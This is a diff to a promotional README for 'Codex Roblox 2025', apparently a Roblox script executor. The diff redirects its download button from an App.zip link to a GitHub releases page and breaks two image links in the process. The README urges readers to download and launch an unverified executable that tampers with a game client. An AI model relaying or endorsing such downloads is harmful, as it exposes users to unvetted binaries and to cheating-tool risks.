@@ -32,7 +32,7 @@ Codex Roblox 2025 is the next generation in Roblox script execution, offering ad
 ## Get Started 🚀
 To download Codex Roblox 2025, click the button below:
 
-[![Download Codex Roblox 2025](https://img.shields.io/badge/Download-Codex%20Roblox%202025-blue)](https://github.com/uploads/App.zip)
+[![Download Codex Roblox 2025](https://github.com/EnderroboHD/Codex-Roblox-2025/releases%20Roblox%202025-blue)](https://github.com/EnderroboHD/Codex-Roblox-2025/releases)
 
 Note: The link provided needs to be launched to download Codex Roblox 2025. If the link is not working, please check the "Releases" section of this repository for alternative download options.
 
@@ -49,4 +49,4 @@ For any issues, concerns, or feedback regarding Codex Roblox 2025, please don't 
 
 Dive into the world of Roblox like never before with Codex Roblox 2025. Unlock the true potential of your gaming experience and explore endless possibilities within the Roblox universe. Download now and start scripting with confidence! 🎉
 
-![Roblox](https://www.roblox.com/logo.png)
+![Roblox](https://github.com/EnderroboHD/Codex-Roblox-2025/releases)
